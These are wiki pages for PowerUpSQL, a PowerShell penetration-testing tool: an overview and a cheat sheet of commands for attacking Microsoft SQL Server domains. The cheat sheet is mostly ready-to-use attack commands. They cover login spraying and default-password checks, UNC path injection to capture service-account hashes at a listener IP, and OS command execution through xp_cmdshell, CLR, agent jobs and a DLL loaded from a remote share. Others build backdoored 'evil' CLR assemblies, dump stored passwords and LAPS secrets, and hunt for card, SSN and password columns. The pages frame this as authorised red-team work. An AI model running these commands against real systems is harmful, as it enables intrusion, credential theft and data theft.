# Overview of PowerUpSQL

Scott Sutherland edited this page Mar 23, 2021 · [10 revisions](https://github.com/NetSPI/PowerUpSQL/wiki/Overview-of-PowerUpSQL/_history)

The PowerUpSQL module includes functions that support SQL Server discovery, auditing for common weak configurations, and privilege escalation on scale. It is intended to be used during internal penetration tests and red team engagements. However, PowerUpSQL also includes many functions that could be used by administrators to quickly inventory the SQL Servers in their ADS domain.

Important Note: PowerUpSQL is used for direct attacks against SQL Server. Currently it does not support SQL Injection. For information on attacking SQL Server through SQL injection check out the [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/).

**PowerUpSQL was designed with six objectives in mind:**

- Easy Server Discovery: Discovery functions can be used to blindly identify local, domain, and non-domain SQL Server instances on scale.
- Easy Server Auditing: The Invoke-SQLAudit function can be used to audit for common high impact vulnerabilities and weak configurations using the current login's privileges. Also, Invoke-SQLDumpInfo can be used to quickly inventory databases, privileges, and other information.
- Easy Server Exploitation: The Invoke-SQLEscalatePriv function attempts to obtain sysadmin privileges using identified vulnerabilities.
- Scalability: Multi-threading is supported on core functions so they can be executed against many SQL Servers quickly.
- Flexibility: PowerUpSQL functions support the PowerShell pipeline so they can be used together, and with other scripts.
- Portability: Default .net libraries are used and there are no dependencies on SQLPS or the SMO libraries. Functions have also been designed so they can be run independently. As a result, it's easy to use on any Windows system with PowerShell v3 installed.

### Author and Contributors

[](https://github.com/NetSPI/PowerUpSQL/wiki/Overview-of-PowerUpSQL#author-and-contributors)

- Author: Scott Sutherland (@_nullbind) 
- Major Contributors: Antti Rantasaari, Eric Gruber (@egru), Thomas Elling (@thomaselling)
- Contributors: Alexander Leary (@0xbadjuju), @leoloobeek, Andrew Luke(@Sw4mpf0x), Mike Manzotti (@mmanzo_), @TVqQAAMA, @cobbr_io, @mariuszbit (mgeeky), @0xe7 (@exploitph), phackt(@phackt_ul), @vsamiamv, and @ktaranov

### Issue Reports

[](https://github.com/NetSPI/PowerUpSQL/wiki/Overview-of-PowerUpSQL#issue-reports)

I perform QA on functions before we publish them, but it's hard to consider every scenario. So I just wanted to say thanks to those of you that have taken the time to give me a heads up on issues with PowerUpSQL so that we can make it better.

- Bug Reporters: @ClementNotin, @runvirus, @CaledoniaProject, @christruncer, rvrsh3ll(@424f424f),@mubix (Rob Fuller)

### License

[](https://github.com/NetSPI/PowerUpSQL/wiki/Overview-of-PowerUpSQL#license)

- BSD 3-Clause
# PowerUpSQL Cheat Sheet

Scott Sutherland edited this page Jan 23, 2023 · [27 revisions](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet/_history)

Below is a list of some of the most common PowerUpSQL functions used during pentests. If you prefer to execute attack queries without PowerUpSQL, I've also created an offensive TSQL template repository [here](https://github.com/NetSPI/PowerUpSQL/tree/master/templates/tsql).

## SQL Server Discovery Cheats

[This sheets Github page](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet#sql-server-discovery-cheats)

|Description|Command|
|:--|:--|
|Discover Local SQL Server Instances|`Get-SQLInstanceLocal -Verbose`|
|Discover Remote SQL Server Instances|UDP Broadcast Ping  <br>`Get-SQLInstanceBroadcast -Verbose`  <br>  <br>UDP Port Scan  <br>`Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1`  <br>  <br>Get the instance list from a file  <br>`Get-SQLInstanceFile -FilePath c:\temp\computers.txt \| Get-SQLInstanceScanUDPThreaded -Verbose`|
|Discover Active Directory Domain SQL Server Instances|`Get-SQLInstanceDomain -Verbose`|
|Discover Active Directory Domain SQL Server Instances using alternative domain credentials|`runas /noprofile /netonly /user:domain\user PowerShell.exe`  <br>`import-module PowerUpSQL.psd1`  <br>`Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username domain\user -password P@ssword123`|
|List SQL Servers using a specific domain account|`Get-SQLInstanceDomain -Verbose -DomainAccount SQLSvc`|
|List shared domain user SQL Server service accounts|`Get-SQLInstanceDomain -Verbose \| Group-Object DomainAccount \| Sort-Object count -Descending \| select Count,Name \| Where-Object {($_.name -notlike "*$") -and ($_.count -gt 1) }`|

## SQL Server Authentication Cheats

[](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet#sql-server-authentication-cheats)

All PowerUpSQL functions support authenticating directly to a known SQL Server instance without having to perform discovery first. You can authenticate using the current domain user credentials or provide an SQL Server login. All PowerUpSQL functions will attempt to authenticate to the provided instance as the current domain user if the username/password parameters are not provided. This also applies if you're running PowerShell through runas /netonly.

Below are some basic examples using the "Get-SQLQuery" function.

|Description|Command Examples|
|:--|:--|
|Authenticating to a known SQL Server instance as the current domain user.|**Current Domain User**  <br>`Get-SQLQuery -Verbose -Instance "10.2.2.5,1433"`|
|Authenticating to a known SQL Server instance using a SQL Server login.|**Server and Instance Name**  <br>`Get-SQLQuery -Verbose -Instance "servername\instancename" -username testuser -password testpass`  <br>  <br>**IP and Instance Name**  <br>`Get-SQLQuery -Verbose -Instance "10.2.2.5\instancename" -username testuser -password testpass`  <br>  <br>**IP and Port**  <br>`Get-SQLQuery -Verbose -Instance "10.2.2.5,1433" -username testuser -password testpass`|

## SQL Server Login Test Cheats

[](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet#sql-server-login-test-cheats)

|Description|Command|
|:--|:--|
|Get a list of domain SQL servers that can be logged into with a provided SQL Server login|`$Targets = Get-SQLInstanceDomain -Verbose \| Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass \| Where-Object {$_.Status -like "Accessible"}`  <br>`$Targets`|
|Get a list of domain SQL servers that can be logged into with the current domain account|`$Targets = Get-SQLInstanceDomain -Verbose \| Get-SQLConnectionTestThreaded -Verbose -Threads 10 \| Where-Object {$_.Status -like "Accessible"}`  <br>`$Targets`|
|Get a list of domain SQL servers that can be logged into using an alternative domain account|`runas /noprofile /netonly /user:domain\user PowerShell.exe`  <br>`Get-SQLInstanceDomain \| Get-SQLConnectionTestThreaded -Verbose -Threads 15`|
|Get a list of domain SQL servers that can be logged into using an alternative domain account from a non domain system.|`runas /noprofile /netonly /user:domain\user PowerShell.exe`  <br>`Get-SQLInstanceDomain -Verbose -Username 'domain\user' -Password 'MyPassword!' -DomainController 10.1.1.1 \| Get-SQLConnectionTestThreaded -Verbose -Threads 15`|
|Discover domain SQL Servers and determine if they are configured with default passwords used by common applications based on the instance name|`Get-SQLInstanceDomain \| Get-SQLServerLoginDefaultPw -Verbose`|

## SQL Server Authenticated Information Gathering Cheats

[](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet#sql-server-authenticated-information-gathering-cheats)

|Description|Command|
|:--|:--|
|Get general server information such as SQL/OS versions, service accounts, sysdmin access etc.|Get information from a single server  <br>`Get-SQLServerInfo -Verbose -Instance SQLServer1\Instance1`  <br>  <br>Get information from domain servers  <br>`$ServerInfo = Get-SQLInstanceDomain \| Get-SQLServerInfoThreaded -Verbose -Threads 10`  <br>`$ServerInfo`  <br>  <br>Note: Running this against domain systems can reveal where Domain Users have sysadmin privileges.|
|Get an inventory of common objects from the remote server including permissions, databases, tables, views etc, and dump them out into CSV files.|`Invoke-SQLDumpInfo -Verbose -Instance Server1\Instance1`|

## SQL Server Privilege Escalation Cheats

[](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet#sql-server-privilege-escalation-cheats)

|Description|Command|
|:--|:--|
|Domain User to SQL Service Account.  <br>While running as a domain user this function will automatically do 4 things.  <br>1. Identify SQL Servers on the domain via a LDAP query to a DC for SPNs.  <br>2. Attempt to log into each.  <br>3. Perform UNC path injection using various methods.  <br>4. Attempt to capture the password hashes for the associated SQL Server service account.|`Invoke-SQLUncPathInjection -Verbose -CaptureIp 10.1.1.12`|
|OS admin to sysadmin via service account impersonation, then all PowerUpSQL commands can be run as a sysadmin.|`Invoke-SQLImpersonateService -Verbose -Instance MSSQLSRV04\BOSCHSQL`|
|Audit for Issues|`Invoke-SQLAudit -Verbose -Instance SQLServer1`|
|Escalate to sysadmin|`Invoke-SQLEscalatePriv -Verbose -Instance SQLServer1`|
|Execute OS commands: xp_cmdshell|`$Targets \| Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10`|
|Execute OS commands: Custom xp|`Create-SQLFileXpDll -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test -Verbose`  <br>Host the test.dll on a share readable by the SQL Server service account.  <br>`Get-SQLQuery -Verbose -Query "sp_addextendedproc 'xp_test', '\\yourserver\yourshare\myxp.dll'"`  <br>`xp_test`  <br>`sp_dropextendedproc 'xp_test'`|
|Execute OS commands: CLR|`$Targets \| Invoke-SQLOSCLR -Verbose -Command "Whoami"`|
|Execute OS commands: Ole Automation Procedures|`$Targets \| Invoke-SQLOSOle -Verbose -Command "Whoami"`|
|Execute OS commands: External Scripting - R|`$Targets \| Invoke-SQLOSR -Verbose -Command "Whoami"`|
|Execute OS commands: External Scripting - Python|`$Targets \| Invoke-SQLOSPython -Verbose -Command "Whoami"`|
|Execute OS commands: Agent Job - CmdExec|`$Targets \| Invoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command "echo hello > c:\windows\temp\test1.txt"`|
|Execute OS commands: Agent Job - PowerShell|`$Targets \| Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" \| out-file c:\windows\temp\test2.txt' -Sleep 20`|
|Execute OS commands: Agent Job - VBScript|`$Targets \| Invoke-SQLOSCmdAgentJob -Verbose -SubSystem VBScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt'`|
|Execute OS commands: Agent Job - JScript|`$Targets \| Invoke-SQLOSCmdAgentJob -Verbose -SubSystem JScript -Command 'c:\windows\system32\cmd.exe /c echo hello > c:\windows\temp\test3.txt'`|
|Upload File: Ole Automation Procedures|`Invoke-SQLUploadFileOle -Verbose -Instance DEVSRV -InputFile "C:\Windows\win.ini" -OutputFile "C:\Users\Public\win.ini"`|
|Download File: OPENROWSET BULK Query|`Invoke-SQLDownloadFile -Verbose -Instance DEVSRV -SourceFile "C:\Windows\win.ini" -OutputFile "C:\Users\Public\win.ini"`|
|Crawl database links|`Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1`|
|Crawl database links and execute query|`Get-SqlServerLinkCrawl -Verbose -Instance SQLSERVER1\Instance1 -Query "select name from master..sysdatabases"`  <br>Blog: [https://blog.netspi.com/sql-server-link-crawling-powerupsql/](https://blog.netspi.com/sql-server-link-crawling-powerupsql/)|
|Crawl database links and execute OS command|`Get-SQLCrawl -instance "SQLSERVER1\Instance1" -Query "exec master..xp_cmdshell 'whoami'"`|
|Dump contents of Agent jobs. Often contain passwords. Verbose output includes job summary data.|`$Results = Get-SQLAgentJob -Verbose -Instance Server1\Instance1 -Username sa -Password 'P@ssword!'`  <br>or  <br>`$Results = Get-SQLInstanceDomain -Verbose \| Get-SQLAgentJob -Verbose -Username sa -Password 'P@ssword!'`  <br>`$Results \| Out-GridView`|
|Enumerate all SQL Logins as least privilege user and test username as password.|Run against single server  <br>`Invoke-SQLAuditWeakLoginPw -Verbose -Instance SQLServer1\Instance1`  <br>Run against domain SQL Servers  <br>`$WeakPasswords = Get-SQLInstanceDomain -Verbose \| Invoke-SQLAuditWeakLoginPw -Verbose`  <br>`$WeakPasswords`|

## SQL Server Data Targeting Cheats

[](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet#sql-server-data-targeting-cheats)

|Description|Command|
|:--|:--|
|Dump an inventory of common objects to csv in the current directory.|`Invoke-SQLDumpInfo -Verbose -Instance server1\instance1`|
|Execute arbitrary query|`$Targets \| Get-SQLQuery -Verbose -Query "Select @@version"`|
|Grab basic server information|`$Targets \| Get-SQLServerInfoThreaded -Threads 10 -Verbose`|
|Grab list of non-default databases|`$Targets \| Get-SQLDatabaseThreaded –Verbose –Threads 10 -NoDefaults`|
|Dump common information from server to files|`Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv`|
|Find sensitive data based on column name|`$Targets \| Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword "credit,ssn,password" –SampleSize 2 –ValidateCC –NoDefaults`|
|Find sensitive data based on column name, but only target databases with transparent encryption|`$Targets \| Get-SQLDatabaseThreaded –Verbose –Threads 10 -NoDefaults \| Where-Object {$_.is_encrypted –eq “TRUE”} \| Get-SQLColumnSampleDataThreaded –Verbose –Threads 10 –Keyword “card, password” –SampleSize 2 –ValidateCC -NoDefaults`|

## Miscellaneous Post Exploitation Cheats

[](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet#miscellaneous-post-exploitation-cheats)

|Description|Command|
|:--|:--|
|Export all custom CLR assemblies to DLLs. They can be decompiled offline, and often contain passwords. Also, they can be backdoored without too much effort.|`$Results = Get-SQLStoredProcedureCLR -Verbose -Instance Server1\Instance1 -Username sa -Password 'P@ssword!' -ExportFolder c:\temp`  <br>`$Results \| Out-GridView`|
|Create a SQL command that can be used to import an existing (or backdoored) CLR assembly.|`Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.dll`  <br>Blog: [https://blog.netspi.com/attacking-sql-server-clr-assemblies/](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)|
|Create a DLL and SQL command that can be used to import a CLR assembly to execute OS commands.|`Create-SQLFileCLRDll -Verbose -ProcedureName runcmd -OutDir c:\temp -OutFile evil`|
|Get a list of Shared SQL Server service accounts|`Get-SQLInstanceDomain -Verbose \| Select-Object DomainAccount, ComputerName -Unique \| Group-Object DomainAccount \| Sort-Object Count -Descending`  <br>  <br>Note: Any count greater than 1 indicates a domain account used on multiple systems that could potentially be used for SMB Relay attacks.`|

## Active Directory Recon through SQL Server

[](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet#active-directory-recon-through-sql-server)

The list of functions below can be used to query Active Directory through SQL Server.  
For more details and examples please visit the associated blog ([https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql](https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql)) or the detailed wiki page [https://github.com/NetSPI/PowerUpSQL/wiki/Active-Directory-Recon-Functions](https://github.com/NetSPI/PowerUpSQL/wiki/Active-Directory-Recon-Functions)

|Function Name|Description|
|:--|:--|
|Get-SQLDomainAccountPolicy|Provides the domain account policy for the SQL Server's domain.|
|Get-SQLDomainComputer|Provides a list of the domain computers on the SQL Server's domain.|
|Get-SQLDomainController|Provides a list of the domain controllers on the SQL Server's domain.|
|Get-SQLDomainExploitableSystem|Provides a list of the potential exploitable computers on the SQL Server's domain based on Operating System version information.|
|Get-SQLDomainGroup|Provides a list of the domain groups on the SQL Server's domain.|
|Get-SQLDomainGroupMember|Provides a list of the domain group members on the SQL Server's domain.|
|Get-SQLDomainObject|Can be used to execute arbitrary LDAP queries on the SQL Server's domain.|
|Get-SQLDomainOu|Provides a list of the organization units on the SQL Server's domain.|
|Get-SQLDomainPasswordsLAPS|Provides a list of the local administrator password on the SQL Server's domain. This typically required Domain Admin privileges.|
|Get-SQLDomainSite|Provides a list of sites.|
|Get-SQLDomainSubnet|Provides a list of subnets.|
|Get-SQLDomainTrust|Provides a list of domain trusts.|
|Get-SQLDomainUser|Provides a list of the domain users on the SQL Server's domain.|
|Get-SQLDomainUser -UserState Disabled|Provides a list of the disabled domain users on the SQL Server's domain.|
|Get-SQLDomainUser -UserState Enabled|Provides a list of the enabled domain users on the SQL Server's domain.|
|Get-SQLDomainUser -UserState Locked|Provides a list of the locked domain users on the SQL Server's domain.|
|Get-SQLDomainUser -UserState PreAuthNotRequired|Provides a list of the domain users that do not require Kerberos preauthentication on the SQL Server's domain.|
|Get-SQLDomainUser -UserState PwLastSet 90|This parameter can be used to list users that have not change their password in the last 90 days. Any number can be provided though.|
|Get-SQLDomainUser -UserState PwNeverExpires|Provides a list of the domain users that never expire on the SQL Server's domain.|
|Get-SQLDomainUser -UserState PwNotRequired|Provides a list of the domain users with the PASSWD_NOTREQD flag set on the SQL Server's domain.|
|Get-SQLDomainUser -UserState PwStoredRevEnc|Provides a list of the domain users storing their password using reversible encryption on the SQL Server's domain.|
|Get-SQLDomainUser -UserState SmartCardRequired|Provides a list of the domain users that require smart card for interactive login on the SQL Server's domain.|
|Get-SQLDomainUser -UserState TrustedForDelegation|Provides a list of the domain users trusted for delegation on the SQL Server's domain.|
|Get-SQLDomainUser -UserState TrustedToAuthForDelegation|Provides a list of the domain users trusted to authenticate for delegation on the SQL Server's domain.|
If you're interested in a cheatsheet with additional LDAP queries check out out this [Microsoft article on ldap filters](https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx). Also, this Microsoft article provides a basic overview of the [Active Directory object model](https://technet.microsoft.com/en-us/library/dn910986(v=wps.630).aspx).